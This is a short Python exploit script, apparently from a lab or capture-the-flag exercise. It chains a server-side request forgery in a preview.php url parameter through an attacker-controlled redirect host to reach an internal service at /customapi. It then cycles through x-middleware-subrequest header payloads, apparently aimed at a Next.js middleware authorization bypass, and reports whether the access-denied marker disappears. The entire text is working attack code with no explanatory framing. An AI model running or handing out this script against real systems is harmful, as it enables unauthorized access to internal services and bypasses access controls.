import requests, urllib.parse

BASE = 'http://10.82.159.192/preview.php?url='
ATTACKER = 'http://192.168.223.117:8000'
TARGET_PATH = '/customapi'

target = 'http://127.0.0.1:10000' + TARGET_PATH
redir = ATTACKER + '/redirect?to=' + urllib.parse.quote(target, safe='')
full = BASE + urllib.parse.quote(redir, safe='')

payloads = [
    None,
    'middleware',
    'src/middleware',
    'middleware:middleware:middleware:middleware:middleware',
    'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware',
    'pages/_middleware',
]

for p in payloads:
    headers = {}
    if p is not None:
        headers['x-middleware-subrequest'] = p
    r = requests.get(full, headers=headers, timeout=10)
    body = r.text
    marker = 'Unauthorised access to this system is strictly prohibited.' in body
    not_found = 'This page could not be found.' in body
    print(f'payload={p!r} len={len(body)} unauthorized={marker} notfound={not_found}')
